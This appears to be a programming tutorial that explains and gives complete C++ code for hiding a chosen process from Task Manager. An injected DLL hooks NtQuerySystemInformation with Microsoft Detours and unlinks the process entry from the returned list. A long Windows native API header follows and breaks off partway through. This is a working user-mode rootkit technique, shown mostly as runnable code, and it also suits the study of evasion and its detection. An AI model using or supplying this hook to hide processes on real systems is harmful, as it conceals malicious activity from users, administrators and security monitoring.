<Callout type="info" title="Overview">
Monitoring tools like Task Manager or Process Explorer retrieve the list of running processes by calling the Native API function `NtQuerySystemInformation` with the `SystemProcessInformation` class. 

This function returns a singly-linked list of `SYSTEM_PROCESS_INFORMATION` structures in user-space. By installing an inline hook on `NtQuerySystemInformation` using **Microsoft Detours**, we can intercept the buffer after the kernel fills it, locate our target process, and **unlink it** from the chain before it is returned to the application. This effectively makes the process invisible to that specific monitoring tool.
</Callout>

## Execution Flowchart

```mermaid
sequenceDiagram
    autonumber
    participant TaskMgr as Task Manager
    participant Hook as Hook (HNtQuerySystemInformation)
    participant Orig as Original NtQuerySystemInformation
    participant Kernel as Windows Kernel

    TaskMgr->>Hook: Request process list
    Hook->>Orig: Call original function to retrieve data
    Orig->>Kernel: Query SystemProcessInformation
    Kernel-->>Orig: Return buffer with all processes
    Orig-->>Hook: Return buffer (includes Target Process)
    
    rect rgb(19, 33, 60)
    Note over Hook: Parse SYSTEM_PROCESS_INFORMATION Linked List
    loop Iterate through Entries
        Hook->>Hook: Check if Current process == Target
        alt Match found
            Hook->>Hook: Modify prev->NextEntryOffset to skip Target
            Note right of Hook: Target unlinked from chain
        end
    end
    end
    
    Hook-->>TaskMgr: Return modified buffer
    Note over TaskMgr: Target process is now invisible!
```



## Code Implementation

This project consists of two files: the main hooking logic (`main.cpp`) and the undocumented NTAPI structures (`NT.hpp`). Both are provided below.

<Tabs>
  <Tab title="Main Code (main.cpp)">
    This file contains the Detours hooking logic, the `HNtQuerySystemInformation` detour function, and the `DllMain` entry point. It must be compiled as a DLL and injected into the target monitoring process.

    ```cpp Source Code (main.cpp)
    #include <Windows.h>
    #include <cstdio>
    #include <string>
    #include "NT.hpp"
    #include "C:\Detours\detours.h"
    #include "C:\Detours\detver.h"

    #pragma comment(lib,"C:\\Detours\\detours.lib")

    constexpr auto HIDE_PROCNAME = L"Notepad.exe"; // the name of the process to hide from the process list

    constexpr bool NT_SUCCESS(NTSTATUS status) noexcept
    {
        return status >= 0;
    }

    using TNtQuerySystemInformation = decltype(&::NtQuerySystemInformation);


    TNtQuerySystemInformation ONtQuerySystemInformation{ nullptr };

    static bool CMPSTRING(
        const std::wstring& a,
        const std::wstring& b)
    {
        if (a.empty() || b.empty()) return false;
        return CompareStringOrdinal(
            a.c_str(), -1,
            b.c_str(), -1,
            TRUE
        ) == CSTR_EQUAL;
    }


    static NTSTATUS NTAPI HNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength) {

        // call the original function to retrieve the information data
        NTSTATUS status{ ONtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength) };

        // check if the caller wants to see process information data
        
        if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status)) {

            // if so, parse the output
            PSYSTEM_PROCESS_INFORMATION cur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
            PSYSTEM_PROCESS_INFORMATION prev = nullptr;

            while (cur) {
                // if the current record in the array is pointing to our hidden process...
                if (cur->ImageName.Buffer && cur->ImageName.Length && CMPSTRING(cur->ImageName.Buffer, HIDE_PROCNAME)) {
                    // ... and is the first record in the array
                    if (!prev) {
                        // skip the first record
                        if (cur->NextEntryOffset) SystemInformation = (LPBYTE)SystemInformation + cur->NextEntryOffset;
                        // ... unless there's nothing more left in the array
                        else {
                            SystemInformation = nullptr;
                            break;   // exit the loop
                        }
                    }
                    // ... otherwise, fix the previous record to point to the next one from the current
                    else {
                        if (cur->NextEntryOffset) prev->NextEntryOffset += cur->NextEntryOffset;
                        else
                            // ... unless there's no any
                            prev->NextEntryOffset = 0;
                    }
                }
                // otherwise, save the pointer to current record...
                else prev = cur;

                // ... and move to the next record, if exists
                if (cur->NextEntryOffset) cur = (SYSTEM_PROCESS_INFORMATION*)((LPBYTE)cur + cur->NextEntryOffset);
                else break; // if not, exit the loop
            }

        }

        return status;
    }


    static BOOL HOOK() {
        // attach the hook to the original function
        ONtQuerySystemInformation = (TNtQuerySystemInformation)DetourFindFunction("ntdll.dll", "NtQuerySystemInformation");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach((PVOID*)&ONtQuerySystemInformation, HNtQuerySystemInformation);
        return DetourTransactionCommit() == NO_ERROR;
    }

    static BOOL UNHOOK() {
        // detach the hook from the original function
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach((PVOID*)&ONtQuerySystemInformation, HNtQuerySystemInformation);
        return DetourTransactionCommit() == NO_ERROR;
    }


    BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

        if (DetourIsHelperProcess()) {
            return TRUE;
        }

        switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            HOOK();
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            UNHOOK();
            break;
        }

        return TRUE;
    }
    ```
  </Tab>
  <Tab title="NTAPI Header (NT.hpp)">
    This header defines the undocumented `SYSTEM_PROCESS_INFORMATION` structure, the `SYSTEM_INFORMATION_CLASS` enumeration, and the `NtQuerySystemInformation` function prototype. These are not included in standard Windows SDK headers.

    ```cpp Header File (NT.hpp)
    #pragma once

    #include <stddef.h>

    #if !defined(_WIN32) || !defined(_WIN64)
    #error This header is intended for Windows x64 only.
    #endif

    typedef struct _UNICODE_STRING
    {
        USHORT Length;
        USHORT MaximumLength;
        PWCH   Buffer;
    } UNICODE_STRING, * PUNICODE_STRING;

    typedef LONG KPRIORITY, * PKPRIORITY;

    typedef struct _CLIENT_ID
    {
        HANDLE UniqueProcess;
        HANDLE UniqueThread;
    } CLIENT_ID, * PCLIENT_ID;

    typedef enum _KTHREAD_STATE
    {
        Initialized,
        Ready,
        Running,
        Standby,
        Terminated,
        Waiting,
        Transition,
        DeferredReady,
        GateWaitObsolete,
        WaitingForProcessInSwap,
        MaximumThreadState
    } KTHREAD_STATE, * PKTHREAD_STATE;

    typedef enum _KWAIT_REASON
    {
        Executive,               // Waiting for an executive event.
        FreePage,                // Waiting for a free page.
        PageIn,                  // Waiting for a page to be read in.
        PoolAllocation,          // Waiting for a pool allocation.
        DelayExecution,          // Waiting due to a delay execution.           // NtDelayExecution
        Suspended,               // Waiting because the thread is suspended.    // NtSuspendThread
        UserRequest,             // Waiting due to a user request.              // NtWaitForSingleObject
        WrExecutive,             // Waiting for an executive event.
        WrFreePage,              // Waiting for a free page.
        WrPageIn,                // Waiting for a page to be read in.
        WrPoolAllocation,        // Waiting for a pool allocation.              // 10
        WrDelayExecution,        // Waiting due to a delay execution.
        WrSuspended,             // Waiting because the thread is suspended.
        WrUserRequest,           // Waiting due to a user request.
        WrEventPair,             // Waiting for an event pair.                  // NtCreateEventPair
        WrQueue,                 // Waiting for a queue.                        // NtRemoveIoCompletion
        WrLpcReceive,            // Waiting for an LPC receive.                 // NtReplyWaitReceivePort
        WrLpcReply,              // Waiting for an LPC reply.                   // NtRequestWaitReplyPort
        WrVirtualMemory,         // Waiting for virtual memory.
        WrPageOut,               // Waiting for a page to be written out.       // NtFlushVirtualMemory
        WrRendezvous,            // Waiting for a rendezvous.                   // 20
        WrKeyedEvent,            // Waiting for a keyed event.                  // NtCreateKeyedEvent
        WrTerminated,            // Waiting for thread termination.
        WrProcessInSwap,         // Waiting for a process to be swapped in.
        WrCpuRateControl,        // Waiting for CPU rate control.
        WrCalloutStack,          // Waiting for a callout stack.
        WrKernel,                // Waiting for a kernel event.
        WrResource,              // Waiting for a resource.
        WrPushLock,              // Waiting for a push lock.
        WrMutex,                 // Waiting for a mutex.
        WrQuantumEnd,            // Waiting for the end of a quantum.           // 30
        WrDispatchInt,           // Waiting for a dispatch interrupt.
        WrPreempted,             // Waiting because the thread was preempted.
        WrYieldExecution,        // Waiting to yield execution.
        WrFastMutex,             // Waiting for a fast mutex.
        WrGuardedMutex,          // Waiting for a guarded mutex.
        WrRundown,               // Waiting for a rundown.
        WrAlertByThreadId,       // Waiting for an alert by thread ID.
        WrDeferredPreempt,       // Waiting for a deferred preemption.
        WrPhysicalFault,         // Waiting for a physical fault.
        WrIoRing,                // Waiting for an I/O ring.                    // 40
        WrMdlCache,              // Waiting for an MDL cache.
        WrRcu,                   // Waiting for read-copy-update (RCU) synchronization.
        MaximumWaitReason
    } KWAIT_REASON, * PKWAIT_REASON;

    typedef struct _SYSTEM_THREAD_INFORMATION
    {
        LARGE_INTEGER KernelTime;                   // Number of 100-nanosecond intervals spent executing kernel code.
        LARGE_INTEGER UserTime;                     // Number of 100-nanosecond intervals spent executing user code.
        LARGE_INTEGER CreateTime;                   // The date and time when the thread was created.
        ULONG WaitTime;                             // The current time spent in ready queue or waiting (depending on the thread state).
        PVOID StartAddress;                         // The initial start address of the thread.
        CLIENT_ID ClientId;                         // The identifier of the thread and the process owning the thread.
        KPRIORITY Priority;                         // The dynamic priority of the thread.
        KPRIORITY BasePriority;                     // The starting priority of the thread.
        ULONG ContextSwitches;                      // The total number of context switches performed.
        KTHREAD_STATE ThreadState;                  // The current state of the thread.
        KWAIT_REASON WaitReason;                    // The current reason the thread is waiting.
    } SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

    typedef struct _SYSTEM_PROCESS_INFORMATION
    {
        ULONG NextEntryOffset;                      // The address of the previous item plus the value in the NextEntryOffset member. For the last item in the array, NextEntryOffset is 0.
        ULONG NumberOfThreads;                      // The NumberOfThreads member contains the number of threads in the process.
        ULONGLONG WorkingSetPrivateSize;            // The total private memory that a process currently has allocated and is physically resident in memory. // since VISTA
        ULONG HardFaultCount;                       // The total number of hard faults for data from disk rather than from in-memory pages. // since WIN7
        ULONG NumberOfThreadsHighWatermark;         // The peak number of threads that were running at any given point in time, indicative of potential performance bottlenecks related to thread management.
        ULONGLONG CycleTime;                        // The sum of the cycle time of all threads in the process.
        LARGE_INTEGER CreateTime;                   // Number of 100-nanosecond intervals since the creation time of the process. Not updated during system timezone changes.
        LARGE_INTEGER UserTime;                     // Number of 100-nanosecond intervals the process has executed in user mode.
        LARGE_INTEGER KernelTime;                   // Number of 100-nanosecond intervals the process has executed in kernel mode.
        UNICODE_STRING ImageName;                   // The file name of the executable image.
        KPRIORITY BasePriority;                     // The starting priority of the process.
        HANDLE UniqueProcessId;                     // The identifier of the process.
        HANDLE InheritedFromUniqueProcessId;        // The identifier of the process that created this process. Not updated and incorrectly refers to processes with recycled identifiers.
        ULONG HandleCount;                          // The current number of open handles used by the process.
        ULONG SessionId;                            // The identifier of the Remote Desktop Services session under which the specified process is running.
        ULONG_PTR UniqueProcessKey;                 // since VISTA (requires SystemExtendedProcessInformation)
        SIZE_T PeakVirtualSize;                     // The peak size, in bytes, of the virtual memory used by the process.
        SIZE_T VirtualSize;                         // The current size, in bytes, of virtual memory used by the process.
        ULONG PageFaultCount;                       // The total number of page faults for data that is not currently in memory. The value wraps around to zero on average 24 hours.
        SIZE_T PeakWorkingSetSize;                  // The peak working-set size, in bytes.
        SIZE_T WorkingSetSize;                      // The current working-set size, in bytes.
        SIZE_T QuotaPeakPagedPoolUsage;             // The peak quota charged to the process for pool usage, in bytes.
        SIZE_T QuotaPagedPoolUsage;                 // The quota charged to the process for paged pool usage, in bytes.
        SIZE_T QuotaPeakNonPagedPoolUsage;          // The peak quota charged to the process for nonpaged pool usage, in bytes.
        SIZE_T QuotaNonPagedPoolUsage;              // The current quota charged to the process for nonpaged pool usage.
        SIZE_T PagefileUsage;                       // The total number of bytes of page file storage in use by the process.
        SIZE_T PeakPagefileUsage;                   // The maximum number of bytes of page-file storage used by the process.
        SIZE_T PrivatePageCount;                    // The number of memory pages allocated for the use by the process.
        LARGE_INTEGER ReadOperationCount;           // The total number of read operations performed.
        LARGE_INTEGER WriteOperationCount;          // The total number of write operations performed.
        LARGE_INTEGER OtherOperationCount;          // The total number of I/O operations performed other than read and write operations.
        LARGE_INTEGER ReadTransferCount;            // The total number of bytes read during a read operation.
        LARGE_INTEGER WriteTransferCount;           // The total number of bytes written during a write operation.
        LARGE_INTEGER OtherTransferCount;           // The total number of bytes transferred during operations other than read and write operations.
        SYSTEM_THREAD_INFORMATION Threads[1];       // This type is not defined in the structure but was added for convenience.
    } SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

    // Available starting with Windows 11 build 26100.4770.
    typedef struct _SYSTEM_BASICPROCESS_INFORMATION
    {
        ULONG NextEntryOffset;
        HANDLE UniqueProcessId;
        HANDLE InheritedFromUniqueProcessId;
        ULONG64 SequenceNumber;
        UNICODE_STRING ImageName;
    } SYSTEM_BASICPROCESS_INFORMATION, * PSYSTEM_BASICPROCESS_INFORMATION;

    typedef enum _SYSTEM_INFORMATION_CLASS
    {
        SystemBasicInformation,                                 // q: SYSTEM_BASIC_INFORMATION
        SystemProcessorInformation,                             // q: SYSTEM_PROCESSOR_INFORMATION
        SystemPerformanceInformation,                           // q: SYSTEM_PERFORMANCE_INFORMATION
        SystemTimeOfDayInformation,                             // q: SYSTEM_TIMEOFDAY_INFORMATION
        SystemPathInformation,                                  // q: not implemented
        SystemProcessInformation,                               // q: SYSTEM_PROCESS_INFORMATION
        SystemCallCountInformation,                             // q: SYSTEM_CALL_COUNT_INFORMATION
        SystemDeviceInformation,                                // q: SYSTEM_DEVICE_INFORMATION
        SystemProcessorPerformanceInformation,                  // q: SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION (EX in: USHORT ProcessorGroup)
        SystemFlagsInformation,                                 // qs: SYSTEM_FLAGS_INFORMATION
        SystemCallTimeInformation,                              // q: SYSTEM_CALL_TIME_INFORMATION // not implemented // 10
        SystemModuleInformation,                                // q: RTL_PROCESS_MODULES
        SystemLocksInformation,                                 // q: RTL_PROCESS_LOCKS
        SystemStackTraceInformation,                            // q: RTL_PROCESS_BACKTRACES
        SystemPagedPoolInformation,                             // q: not implemented
        SystemNonPagedPoolInformation,                          // q: not implemented
        SystemHandleInformation,                                // q: SYSTEM_HANDLE_INFORMATION
        SystemObjectInformation,                                // q: SYSTEM_OBJECTTYPE_INFORMATION mixed with SYSTEM_OBJECT_INFORMATION
        SystemPageFileInformation,                              // q: SYSTEM_PAGEFILE_INFORMATION
        SystemVdmInstemulInformation,                           // q: SYSTEM_VDM_INSTEMUL_INFO
        SystemVdmBopInformation,                                // q: not implemented // 20
        SystemFileCacheInformation,                             // qs: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypeSystemCache)
        SystemPoolTagInformation,                               // q: SYSTEM_POOLTAG_INFORMATION
        SystemInterruptInformation,                             // q: SYSTEM_INTERRUPT_INFORMATION (EX in: USHORT ProcessorGroup)
        SystemDpcBehaviorInformation,                           // qs: SYSTEM_DPC_BEHAVIOR_INFORMATION; s: SYSTEM_DPC_BEHAVIOR_INFORMATION (requires SeLoadDriverPrivilege)
        SystemFullMemoryInformation,                            // q: SYSTEM_MEMORY_USAGE_INFORMATION // not implemented
        SystemLoadGdiDriverInformation,                         // s: SYSTEM_GDI_DRIVER_INFORMATION (kernel-mode only)
        SystemUnloadGdiDriverInformation,                       // s: SYSTEM_GDI_DRIVER_UNLOAD_INFORMATION (kernel-mode only)
        SystemTimeAdjustmentInformation,                        // qs: SYSTEM_QUERY_TIME_ADJUST_INFORMATION; s: SYSTEM_SET_TIME_ADJUST_INFORMATION (requires SeSystemtimePrivilege)
        SystemSummaryMemoryInformation,                         // q: SYSTEM_MEMORY_USAGE_INFORMATION // not implemented
        SystemMirrorMemoryInformation,                          // qs: (requires license value "Kernel-MemoryMirroringSupported") (requires SeShutdownPrivilege) // 30
        SystemPerformanceTraceInformation,                      // qs: (type depends on EVENT_TRACE_INFORMATION_CLASS)
        SystemObsolete0,                                        // q: not implemented
        SystemExceptionInformation,                             // q: SYSTEM_EXCEPTION_INFORMATION
        SystemCrashDumpStateInformation,                        // s: SYSTEM_CRASH_DUMP_STATE_INFORMATION (requires SeDebugPrivilege)
        SystemKernelDebuggerInformation,                        // q: SYSTEM_KERNEL_DEBUGGER_INFORMATION
        SystemContextSwitchInformation,                         // q: SYSTEM_CONTEXT_SWITCH_INFORMATION
        SystemRegistryQuotaInformation,                         // qs: SYSTEM_REGISTRY_QUOTA_INFORMATION; s (requires SeIncreaseQuotaPrivilege)
        SystemExtendServiceTableInformation,                    // s: SYSTEM_EXTEND_SERVICE_TABLE_INFORMATION (requires SeLoadDriverPrivilege) // loads win32k only
        SystemPrioritySeparation,                               // s: SYSTEM_PRIORITY_SEPARATION_INFORMATION (requires SeTcbPrivilege)
        SystemVerifierAddDriverInformation,                     // s: UNICODE_STRING (requires SeDebugPrivilege) // 40
        SystemVerifierRemoveDriverInformation,                  // s: UNICODE_STRING (requires SeDebugPrivilege)
        SystemProcessorIdleInformation,                         // q: SYSTEM_PROCESSOR_IDLE_INFORMATION (EX in: USHORT ProcessorGroup)
        SystemLegacyDriverInformation,                          // q: SYSTEM_LEGACY_DRIVER_INFORMATION
        SystemCurrentTimeZoneInformation,                       // qs: RTL_TIME_ZONE_INFORMATION
        SystemLookasideInformation,                             // q: SYSTEM_LOOKASIDE_INFORMATION
        SystemTimeSlipNotification,                             // s: HANDLE (NtCreateEvent) (requires SeSystemtimePrivilege)
        SystemSessionCreate,                                    // q: not implemented
        SystemSessionDetach,                                    // q: not implemented
        SystemSessionInformation,                               // q: not implemented (SYSTEM_SESSION_INFORMATION)
        SystemRangeStartInformation,                            // q: SYSTEM_RANGE_START_INFORMATION // 50
        SystemVerifierInformation,                              // qs: SYSTEM_VERIFIER_INFORMATION; s (requires SeDebugPrivilege)
        SystemVerifierThunkExtend,                              // qs: (kernel-mode only)
        SystemSessionProcessInformation,                        // q: SYSTEM_SESSION_PROCESS_INFORMATION
        SystemLoadGdiDriverInSystemSpace,                       // qs: SYSTEM_GDI_DRIVER_INFORMATION (kernel-mode only) (same handler as SystemLoadGdiDriverInformation)
        SystemNumaProcessorMap,                                 // q: SYSTEM_NUMA_INFORMATION
        SystemPrefetcherInformation,                            // qs: PREFETCHER_INFORMATION // PfSnQueryPrefetcherInformation
        SystemExtendedProcessInformation,                       // q: SYSTEM_EXTENDED_PROCESS_INFORMATION
        SystemRecommendedSharedDataAlignment,                   // q: SYSTEM_RECOMMENDED_SHARED_DATA_ALIGNMENT_INFORMATION // KeGetRecommendedSharedDataAlignment
        SystemComPlusPackage,                                   // qs: SYSTEM_COMPLUS_PACKAGE_INFORMATION
        SystemNumaAvailableMemory,                              // q: SYSTEM_NUMA_INFORMATION // 60
        SystemProcessorPowerInformation,                        // q: SYSTEM_PROCESSOR_POWER_INFORMATION (EX in: USHORT ProcessorGroup)
        SystemEmulationBasicInformation,                        // q: SYSTEM_BASIC_INFORMATION
        SystemEmulationProcessorInformation,                    // q: SYSTEM_PROCESSOR_INFORMATION
        SystemExtendedHandleInformation,                        // q: SYSTEM_HANDLE_INFORMATION_EX
        SystemLostDelayedWriteInformation,                      // q: SYSTEM_LOST_DELAYED_WRITE_INFORMATION
        SystemBigPoolInformation,                               // q: SYSTEM_BIGPOOL_INFORMATION
        SystemSessionPoolTagInformation,                        // q: SYSTEM_SESSION_POOLTAG_INFORMATION
        SystemSessionMappedViewInformation,                     // q: SYSTEM_SESSION_MAPPED_VIEW_INFORMATION
        SystemHotpatchInformation,                              // qs: SYSTEM_HOTPATCH_CODE_INFORMATION
        SystemObjectSecurityMode,                               // q: SYSTEM_OBJECT_SECURITY_MODE_INFORMATION // 70
        SystemWatchdogTimerHandler,                             // s: SYSTEM_WATCHDOG_HANDLER_INFORMATION // (kernel-mode only)
        SystemWatchdogTimerInformation,                         // qs: out: SYSTEM_WATCHDOG_TIMER_INFORMATION (EX in: ULONG WATCHDOG_INFORMATION_CLASS) // NtQuerySystemInformationEx
        SystemLogicalProcessorInformation,                      // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx
        SystemWow64SharedInformationObsolete,                   // q: not implemented
        SystemRegisterFirmwareTableInformationHandler,          // s: SYSTEM_FIRMWARE_TABLE_HANDLER // (kernel-mode only)
        SystemFirmwareTableInformation,                         // q: SYSTEM_FIRMWARE_TABLE_INFORMATION
        SystemModuleInformationEx,                              // q: RTL_PROCESS_MODULE_INFORMATION_EX // since VISTA
        SystemVerifierTriageInformation,                        // q: not implemented
        SystemSuperfetchInformation,                            // qs: SUPERFETCH_INFORMATION // PfQuerySuperfetchInformation
        SystemMemoryListInformation,                            // q: SYSTEM_MEMORY_LIST_INFORMATION; s: SYSTEM_MEMORY_LIST_COMMAND (requires SeProfileSingleProcessPrivilege) // 80
        SystemFileCacheInformationEx,                           // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (same as SystemFileCacheInformation)
        SystemThreadPriorityClientIdInformation,                // s: SYSTEM_THREAD_CID_PRIORITY_INFORMATION (requires SeIncreaseBasePriorityPrivilege) // NtQuerySystemInformationEx
        SystemProcessorIdleCycleTimeInformation,                // q: SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION[] (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx
        SystemVerifierCancellationInformation,                  // q: SYSTEM_VERIFIER_CANCELLATION_INFORMATION // name:wow64:whNT32QuerySystemVerifierCancellationInformation
        SystemProcessorPowerInformationEx,                      // q: not implemented
        SystemRefTraceInformation,                              // qs: SYSTEM_REF_TRACE_INFORMATION // ObQueryRefTraceInformation
        SystemSpecialPoolInformation,                           // qs: SYSTEM_SPECIAL_POOL_INFORMATION (requires SeDebugPrivilege) // MmSpecialPoolTag, then MmSpecialPoolCatchOverruns != 0
        SystemProcessIdInformation,                             // q: SYSTEM_PROCESS_ID_INFORMATION
        SystemErrorPortInformation,                             // s: HANDLE (requires SeTcbPrivilege)
        SystemBootEnvironmentInformation,                       // q: SYSTEM_BOOT_ENVIRONMENT_INFORMATION // 90
        SystemHypervisorInformation,                            // q: SYSTEM_HYPERVISOR_QUERY_INFORMATION
        SystemVerifierInformationEx,                            // qs: SYSTEM_VERIFIER_INFORMATION_EX
        SystemTimeZoneInformation,                              // qs: RTL_TIME_ZONE_INFORMATION (requires SeTimeZonePrivilege)
        SystemImageFileExecutionOptionsInformation,             // s: SYSTEM_IMAGE_FILE_EXECUTION_OPTIONS_INFORMATION (requires SeTcbPrivilege)
        SystemCoverageInformation,                              // q: COVERAGE_MODULES s: COVERAGE_MODULE_REQUEST // ExpCovQueryInformation (requires SeDebugPrivilege)
        SystemPrefetchPatchInformation,                         // q: SYSTEM_PREFETCH_PATCH_INFORMATION
        SystemVerifierFaultsInformation,                        // s: SYSTEM_VERIFIER_FAULTS_INFORMATION (requires SeDebugPrivilege)
        SystemSystemPartitionInformation,                       // q: SYSTEM_SYSTEM_PARTITION_INFORMATION
        SystemSystemDiskInformation,                            // q: SYSTEM_SYSTEM_DISK_INFORMATION
        SystemProcessorPerformanceDistribution,                 // q: SYSTEM_PROCESSOR_PERFORMANCE_DISTRIBUTION (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx // 100
        SystemNumaProximityNodeInformation,                     // qs: SYSTEM_NUMA_PROXIMITY_MAP
        SystemDynamicTimeZoneInformation,                       // qs: RTL_DYNAMIC_TIME_ZONE_INFORMATION (requires SeTimeZonePrivilege)
        SystemCodeIntegrityInformation,                         // q: SYSTEM_CODEINTEGRITY_INFORMATION // SeCodeIntegrityQueryInformation
        SystemProcessorMicrocodeUpdateInformation,              // s: SYSTEM_PROCESSOR_MICROCODE_UPDATE_INFORMATION (requires SeLoadDriverPrivilege)
        SystemProcessorBrandString,                             // q: SYSTEM_PROCESSOR_BRAND_STRING // HaliQuerySystemInformation -> HalpGetProcessorBrandString, info class 23
        SystemVirtualAddressInformation,                        // q: SYSTEM_VA_LIST_INFORMATION[]; s: SYSTEM_VA_LIST_INFORMATION[] (requires SeIncreaseQuotaPrivilege) // MmQuerySystemVaInformation
        SystemLogicalProcessorAndGroupInformation,              // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX (EX in: LOGICAL_PROCESSOR_RELATIONSHIP RelationshipType) // since WIN7 // NtQuerySystemInformationEx // KeQueryLogicalProcessorRelationship
        SystemProcessorCycleTimeInformation,                    // q: SYSTEM_PROCESSOR_CYCLE_TIME_INFORMATION[] (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx
        SystemStoreInformation,                                 // qs: SYSTEM_STORE_INFORMATION (requires SeProfileSingleProcessPrivilege) // SmQueryStoreInformation
        SystemRegistryAppendString,                             // s: SYSTEM_REGISTRY_APPEND_STRING_PARAMETERS // 110
        SystemAitSamplingValue,                                 // s: SYSTEM_AIT_SAMPLING_VALUE_INFORMATION (requires SeProfileSingleProcessPrivilege)
        SystemVhdBootInformation,                               // q: SYSTEM_VHD_BOOT_INFORMATION
        SystemCpuQuotaInformation,                              // qs: PS_CPU_QUOTA_QUERY_INFORMATION
        SystemNativeBasicInformation,                           // q: SYSTEM_BASIC_INFORMATION
        SystemErrorPortTimeouts,                                // q: SYSTEM_ERROR_PORT_TIMEOUTS
        SystemLowPriorityIoInformation,                         // q: SYSTEM_LOW_PRIORITY_IO_INFORMATION
        SystemTpmBootEntropyInformation,                        // q: BOOT_ENTROPY_NT_RESULT // ExQueryBootEntropyInformation
        SystemVerifierCountersInformation,                      // q: SYSTEM_VERIFIER_COUNTERS_INFORMATION
        SystemPagedPoolInformationEx,                           // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypePagedPool)
        SystemSystemPtesInformationEx,                          // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypeSystemPtes) // 120
        SystemNodeDistanceInformation,                          // q: USHORT[4*NumaNodes] // (EX in: USHORT NodeNumber) // NtQuerySystemInformationEx
        SystemAcpiAuditInformation,                             // q: SYSTEM_ACPI_AUDIT_INFORMATION // HaliQuerySystemInformation -> HalpAuditQueryResults, info class 26
        SystemBasicPerformanceInformation,                      // q: SYSTEM_BASIC_PERFORMANCE_INFORMATION // name:wow64:whNtQuerySystemInformation_SystemBasicPerformanceInformation
        SystemQueryPerformanceCounterInformation,               // q: SYSTEM_QUERY_PERFORMANCE_COUNTER_INFORMATION // since WIN7 SP1
        SystemSessionBigPoolInformation,                        // q: SYSTEM_SESSION_POOLTAG_INFORMATION // since WIN8
        SystemBootGraphicsInformation,                          // qs: SYSTEM_BOOT_GRAPHICS_INFORMATION (kernel-mode only)
        SystemScrubPhysicalMemoryInformation,                   // qs: MEMORY_SCRUB_INFORMATION
        SystemBadPageInformation,                               // q: SYSTEM_BAD_PAGE_INFORMATION[] (non-pending pages; Poisoned cleared)
        SystemProcessorProfileControlArea,                      // qs: SYSTEM_PROCESSOR_PROFILE_CONTROL_AREA
        SystemCombinePhysicalMemoryInformation,                 // s: MEMORY_COMBINE_INFORMATION, MEMORY_COMBINE_INFORMATION_EX, MEMORY_COMBINE_INFORMATION_EX2 // 130
        SystemEntropyInterruptTimingInformation,                // qs: SYSTEM_ENTROPY_TIMING_INFORMATION
        SystemConsoleInformation,                               // qs: SYSTEM_CONSOLE_INFORMATION // (requires SeLoadDriverPrivilege)
        SystemPlatformBinaryInformation,                        // q: SYSTEM_PLATFORM_BINARY_INFORMATION (requires SeTcbPrivilege)
        SystemPolicyInformation,                                // q: SYSTEM_POLICY_INFORMATION
        SystemHypervisorProcessorCountInformation,              // q: SYSTEM_HYPERVISOR_PROCESSOR_COUNT_INFORMATION
        SystemDeviceDataInformation,                            // q: SYSTEM_DEVICE_DATA_INFORMATION
        SystemDeviceDataEnumerationInformation,                 // q: SYSTEM_DEVICE_DATA_INFORMATION
        SystemMemoryTopologyInformation,                        // q: SYSTEM_MEMORY_TOPOLOGY_INFORMATION
        SystemMemoryChannelInformation,                         // q: SYSTEM_MEMORY_CHANNEL_INFORMATION
        SystemBootLogoInformation,                              // q: SYSTEM_BOOT_LOGO_INFORMATION // 140
        SystemProcessorPerformanceInformationEx,                // q: SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION_EX // (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx // since WINBLUE
        SystemCriticalProcessErrorLogInformation,               // q: SYSTEM_CRITICAL_PROCESS_EXCEPTION_INFORMATION
        SystemSecureBootPolicyInformation,                      // q: SYSTEM_SECUREBOOT_POLICY_INFORMATION
        SystemPageFileInformationEx,                            // q: SYSTEM_PAGEFILE_INFORMATION_EX
        SystemSecureBootInformation,                            // q: SYSTEM_SECUREBOOT_INFORMATION
        SystemEntropyInterruptTimingRawInformation,             // qs: SYSTEM_ENTROPY_TIMING_INFORMATION
        SystemPortableWorkspaceEfiLauncherInformation,          // q: SYSTEM_PORTABLE_WORKSPACE_EFI_LAUNCHER_INFORMATION
        SystemFullProcessInformation,                           // q: SYSTEM_EXTENDED_PROCESS_INFORMATION with SYSTEM_PROCESS_INFORMATION_EXTENSION (requires admin)
        SystemKernelDebuggerInformationEx,                      // q: SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX
        SystemBootMetadataInformation,                          // q: SYSTEM_BOOT_METADATA_INFORMATION // (requires SeTcbPrivilege) // 150
        SystemSoftRebootInformation,                            // qs: SYSTEM_SOFT_REBOOT_INFORMATION (s requires SeTcbPrivilege) // query returns ExSoftRebootFlags; set calls ExpSetSoftRebootFlags
        SystemElamCertificateInformation,                       // s: SYSTEM_ELAM_CERTIFICATE_INFORMATION
        SystemOfflineDumpConfigInformation,                     // q: OFFLINE_CRASHDUMP_CONFIGURATION_TABLE_V2
